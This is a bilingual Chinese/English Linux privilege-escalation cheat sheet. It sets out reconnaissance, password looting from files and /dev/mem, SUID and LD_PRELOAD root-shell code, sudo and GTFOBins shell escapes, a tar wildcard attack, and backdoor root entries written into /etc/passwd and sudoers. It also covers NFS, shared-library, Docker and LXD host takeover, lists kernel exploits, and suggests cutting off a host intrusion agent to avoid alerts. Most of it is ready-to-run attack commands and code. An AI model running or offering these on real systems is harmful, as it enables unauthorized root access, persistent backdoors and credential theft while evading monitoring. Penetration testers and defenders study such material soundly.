### 目录

* [linux提权之前的基本判断](#linux提权之前的基本判断)
* [搜集项](#搜集项)
* 提权方法
  * [Looting for passwords](#looting-for-passwords)
    * Files containing passwords
    * Old passwords in /etc/security/opasswd
    * Last edited files
    * In memory passwords
    * Find sensitive files
  * [Scheduled tasks](#scheduled-tasks)
    * Cron jobs
    * Systemd timers
  * [SUID](#suid)
    * [Find SUID binaries](#find-suid-binaries)
    * [Create a SUID binary](#create-a-suid-binary)
  * [Capabilities](#capabilities)
    * List capabilities of binaries
    * Edit capabilities
    * Interesting capabilities
  * [SUDO](#sudo)
    * [NOPASSWD](#nopasswd)
    * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
    * [Doas](#doas)
    * [sudo_inject](#sudo-inject)
  * [GTFOBins](#gtfobins)
  * [Wildcard](#wildcard)
  * [Writable files](#writable-files)
    * [Writable /etc/passwd](#writable-etcpasswd)
    * [Writable /etc/sudoers](#writable-etcsudoers)
  * [NFS Root Squashing](#nfs-root-squashing)
  * [Shared Library](#shared-library)
    * [ldconfig](#ldconfig)
    * [RPATH](#rpath)
  * [Groups](#groups)
    * [Docker](#docker)
    * [LXC/LXD](#lxclxd)
  * [Kernel Exploits](#kernel-exploits)
    * [CVE-2016-5195 (DirtyCow)](#CVE-2016-5195-dirtycow)
    * [CVE-2010-3904 (RDS)](#[CVE-2010-3904-rds)
    * [CVE-2010-4258 (Full Nelson)](#CVE-2010-4258-full-nelson)
    * [CVE-2012-0056 (Mempodipper)](#CVE-2012-0056-mempodipper)

#### linux提权之前的基本判断

查看管理员是否在线
```shell
w
```

虚拟机检测
```shell
# check VM(virtual machine)
# 如果有结果则为虚拟机
cat /proc/cpuinfo | grep -q "hypervisor"
```

连接管理
```shell
# Connected IP Addresses:
# 查看与当前主机建立连接的IP  (以root权限执行命令)
netstat -anpt | grep ESTABLISHED | awk '{ print $5 }' | cut -d: -f1 | sort -u

# IP Addresses connected via SSH:
# 查看与当前主机(通过SSH)建立连接的IP
netstat -tnpa | grep 'ESTABLISHED.*sshd' | awk '{ print $5 }' | cut -d: -f1 | sort -u

# Ban an IP Address:
# 禁止源IP 1.1.1.1 对本机访问
iptables -A INPUT -s 1.1.1.1 -j DROP

# 有权限的情况下 从主机上做网络ACL限制 使agent"失联" 可以避免HIDS告警?
```

#### 搜集项

* Kernel and distribution release details
* System Information:
  * Hostname
  * Networking details:
  * Current IP
  * Default route details
  * DNS server information
* User Information:
  * Current user details
  * Last logged on users
  * Shows users logged onto the host
  * List all users including uid/gid information
  * List root accounts
  * Extracts password policies and hash storage method information
  * Checks umask value
  * Checks if password hashes are stored in /etc/passwd
  * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
  * Attempt to read restricted files i.e. /etc/shadow
  * List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
  * Basic SSH checks
* Privileged access:
  * Which users have recently used sudo
  * Determine if /etc/sudoers is accessible
  * Determine if the current user has Sudo access without a password
  * Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
  * Is root's home directory accessible
  * List permissions for /home/
* Environmental:
  * Display current $PATH
  * Displays env information
* Jobs/Tasks:
  * List all cron jobs
  * Locate all world-writable cron jobs
  * Locate cron jobs owned by other users of the system
  * List the active and inactive systemd timers
* Services:
  * List network connections (TCP & UDP)
  * List running processes
  * Lookup and list process binaries and associated permissions
  * List inetd.conf/xined.conf contents and associated binary file permissions
  * List init.d binary permissions
* Version Information (of the following):
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * Checks user config
    * Shows enabled modules
    * Checks for htpasswd files
    * View www directories
* Default/Weak Credentials:
  * Checks for default/weak Postgres accounts
  * Checks for default/weak MYSQL accounts
* Searches:
  * Locate all SUID/GUID files
  * Locate all world-writable SUID/GUID files
  * Locate all SUID/GUID files owned by root
  * Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
  * Locate files with POSIX capabilities
  * List all world-writable files
  * Find/list all accessible *.plan files and display contents
  * Find/list all accessible *.rhosts files and display contents
  * Show NFS server details
  * Locate *.conf and *.log files containing keyword supplied at script runtime
  * List all *.conf files located in /etc
  * Locate mail
* Platform/software specific tests:
  * Checks to determine if we're in a Docker container
  * Checks to see if the host has Docker installed
  * Checks to determine if we're in an LXC container


### Checklists - linux 提权方法

----

#### Looting for passwords

密码搜集

```shell
# ---------------
# 查找包含密码的文件
# Files containing passwords

# grep命令  -I是忽略二进制文件(.so之类的)
grep -I --exclude-dir="排除某个目录" --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

# find命令
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# ---------------
# 最近编辑过的文件
# Last edited files

# Files that were edited in the last 10 minutes
# 最近10分钟内编辑过的文件(macOS下也可以用这条命令)

find / -mmin -10 2>/dev/null | grep -Ev "^/proc" | grep -Ev "^/sys"

# ---------------
# 内存中的密码
# In memory passwords

strings /dev/mem -n 10 | grep -i PASS

# ---------------
# 查找敏感文件
# Find sensitive files

$ locate password | less
如结果
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
...

```

如果主机上部署了web应用等代码,可以考虑从代码中搜集敏感信息(IP 域名 凭证)

----

#### Scheduled tasks

计划任务

```shell
# ---------------
# Cron jobs

# 检查您是否具有对这些文件具有写入权限的访问权限。
# 检查文件内部，找到具有写权限的其他路径。

/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/at.allow
/etc/at.deny
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root




# ---------------
# Systemd timers
# 系统定时器


systemctl list-timers --all
# 如结果
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

3 timers listed.
```

----

#### SUID

```shell
# SUID/Setuid代表 "执行时设置用户ID"
# 它默认情况下在每个Linux发行版中都启用.
# 如果运行某个具有这个bit位的文件,则uid将被属主owner更改掉.
# 如果这个文件属主owner为`root`, 即使是用户`bob`执行了这个文件, uid也将被更改为root.
# SUID bit 被表示为一个 `s`

# SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. 
# If a file with this bit is ran, the uid will be changed by the owner one.
# If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`.
# SUID bit is represented by an `s`.


╭─swissky@lab ~  
╰─$ ls /usr/bin/sudo -alh
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
```


##### Find SUID binaries

```shell
# 寻找已有的 SUID二进制程序

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

# 如结果 可见s
-rwsr-xr-x. 1 root root 36280 11月  6 2016 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 11296 11月  6 2016 /usr/sbin/usernetctl
-rws--x--x. 1 root root 40312 6月  10 2014 /usr/sbin/userhelper
-rwsr-xr-x. 1 root root 11224 11月  6 2016 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 78216 11月  6 2016 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 44232 11月  6 2016 /usr/bin/mount
-rwsr-xr-x. 1 root root 27832 6月  10 2014 /usr/bin/passwd
...
```


##### Create a SUID binary

```shell
# 创建一个 SUID二进制程序的过程

# 1. 写c源代码文件 suid.c

# 程序(1)亲测提权失败
int main(void){
setresuid(0, 0, 0);
system("/bin/sh");

# 程序(2)亲测提权成功
int main()
{
    setgid(0);
    setuid(0);
    system("/bin/sh");
}

# 2. 编译出二进制程序 suid
gcc -o /tmp/suid /tmp/suid.c

# 3. root权限下使用chmod 增加setuid bit
sudo chmod +x /tmp/suid # + 执行权限(execute right)
sudo chmod +s /tmp/suid # + setuid bit
```

----

#### Capabilities

功能

搜索 Linux Capabilities

```shell
# ---------------
# List capabilities of binaries
# 列出二进制文件的功能 使用getcap命令

# 靶机系统
╭─swissky@lab ~  
╰─$ /usr/bin/getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep

# 正常系统
[root@xx opt]# getcap -r /usr/bin
/usr/bin/ping = cap_net_admin,cap_net_raw+p

# ---------------
# Edit capabilities
# 编辑功能

/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add


# ---------------
# Interesting capabilities
# 有趣的功能

#【注意】=ep
# Having the capability =ep means the binary has ALL the capabilites permitted (p) and effective (e) from the start.
#  `=ep` 意味着这个二进制文件具有所有功能. 从一开始就具有所有允许的(p)和有效的(e)的功能.

$ getcap openssl /usr/bin/openssl 
如结果
openssl=ep

# ---------------
# Alternatively the following capabilities can be used in order to upgrade your current privileges.
# 或者可以使用以下功能(capabilities) 来升级你的当前权限

cap_dac_read_search # read anything
cap_setuid+ep # setuid

# Example of privilege escalation with cap_setuid+ep
# 例如 使用 cap_setuid+ep 进行权限提升

$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```

----

#### SUDO

##### NOPASSWD

```shell
# Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.
# Sudo配置可能允许用户在不知道密码的情况下使用其他用户权限执行某些命令。

$ sudo -l
如结果
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim

# In this example the user demo can run vim as root, it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh.
# 例如 名为demo的用户 可以使用root身份运行vim，现在轻易可以获取shell:
# 方法1.通过在根目录中添加ssh密钥

# 方法2.通过调用sh

sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

##### LD_PRELOAD and NOPASSWD

```shell
# If LD_PRELOAD is explicitly defined in the sudoers file
# 如果在sudoers文件中显式定义了 LD_PRELOAD 如下
Defaults        env_keep += LD_PRELOAD

# 使用以下命令 编译c代码
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```c
# shell.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

```shell
# Execute any binary with the LD_PRELOAD to spawn a shell : 
# 使用LD_PRELOAD执行任何二进制文件 以派生得到shell：

sudo LD_PRELOAD=/tmp/shell.so find
```


##### Doas
```
# There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf
# 有一些二进制程序 可以替代 sudo这个二进制程序，比如OpenBSD的doas，记得在/etc/doas.conf检查它的配置，如
# 配置允许:名为demo的用户 可以使用root身份运行vim
permit nopass demo as root cmd vim
```



##### sudo_inject

```
# Using https://github.com/nongiach/sudo_inject

$ sudo whatever
[sudo] password for user:    

# Press <ctrl>+c since you don't have the password. 
# 没有密码时 直接按<ctrl>+c
# This creates an invalid sudo tokens.
# 创建一个无效的sudo tokens

$ sh exploit.sh
.... wait 1 seconds

# no password required :)
# 无需密码
$ sudo -i
# id
uid=0(root) gid=0(root) groups=0(root)
```

Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf

----

#### GTFOBins

https://gtfobins.github.io/

```
# GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
# GTFOBins是Unix二进制文件的精选列表，可被攻击者利用来绕过本地安全限制。

# 如
gdb -nx -ex '!sh' -ex quit
sudo mysql -e '! /bin/sh'
strace -o /dev/null /bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
```

----

#### Wildcard

通配符

[localh0t/wildpwn: unix wildcard attacks](https://github.com/localh0t/wildpwn)
```
# 
By using tar with –checkpoint-action options, a specified action can be used after a checkpoint.
# This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar.
# “Tricking” root to use the specific options is quite easy, and that's where the wildcard comes in handy.


# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```

----

#### Writable files

列出系统中的可写文件
```shell
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

##### Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)

/etc/sysconfig/network-scripts/ifcfg-1337 for example

```shell
NAME=Network /bin/id  &lt;= Note the blank space
ONBOOT=yes
DEVICE=eth0

EXEC :
./etc/sysconfig/network-scripts/ifcfg-1337
```
src : https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f

##### Writable /etc/passwd

First generate a password with one of the following commands.

```shell
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user `hacker` and add the generated password.

```shell
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

You can now use the `su` command with `hacker:hacker`

Alternatively you can use the following lines to add a dummy user without a password.    
WARNING: you might degrade the current security of the machine.

```shell
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`. 

##### Writable /etc/sudoers

```shell
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

----

#### NFS Root Squashing

When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.

当no_root_squash出现在`/etc/exports`中时，该文件夹是可共享的，远程用户可以挂载它

```shell
# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```

----

#### Shared Library

* 方法1 ldconfig - Identify shared libraries with `ldd`

使用`ldd`识别共享库

```shell
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
```

Create a library in `/tmp` and activate the path.

在`/tmp`中创建一个库并激活路径

```shell
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

* 方法2 RPATH

```shell
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

By copying the lib into `/var/tmp/flag15/` it will be used by the program in this place as specified in the `RPATH` variable.

```shell
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

----

#### Groups

* 环境 - Docker

Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.

```shell
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

Almost similar but you will also see all processes running on the host and be connected to the same NICs.

```shell
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell

```shell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```

More docker privilege escalation using the Docker Socket.

```shell
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

* 环境 - LXC/LXD

The privesc requires to run a container with elevated privileges and mount the host filesystem inside.

这个提权方法要求运行一个已经提权过的容器 把需要提权的主机文件系统挂载到其中

```shell
╭─swissky@lab ~  
╰─$ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
```

Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

构建一个Alpine镜像 并使用`security.privileged=true`参数启动 强制容器以root权限与主机文件系统交互

```shell
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# import the image
lxc image import ./alpine.tar.gz --alias myimage

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Alternatively https://github.com/initstring/lxd_root


----

#### root进程

* 以root权限运行的进程
  * MySQL UDF提权
  * redis 未授权 - 利用crontab写定时任务 getshell(该shell继承redis权限)
  * ...

----

#### Kernel Exploits

利用linux内核漏洞提权

|名称|类型|适用环境|描述|
|:-------------:|--|--|-----|
|CVE-2016-5195 (DirtyCow)|Kernel Exploits|Linux Kernel <= 3.19.0-73.8|DirtyCow|
|CVE-2010-3904 (RDS)|Kernel Exploits| Linux Kernel <= 2.6.36-rc8|RDS|
|CVE-2010-4258 (Full Nelson)|Kernel Exploits|Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)|Full Nelson|
|CVE-2012-0056 (Mempodipper)|Kernel Exploits|Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)|Mempodipper |


详细参考 [PayloadsAllTheThings/Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
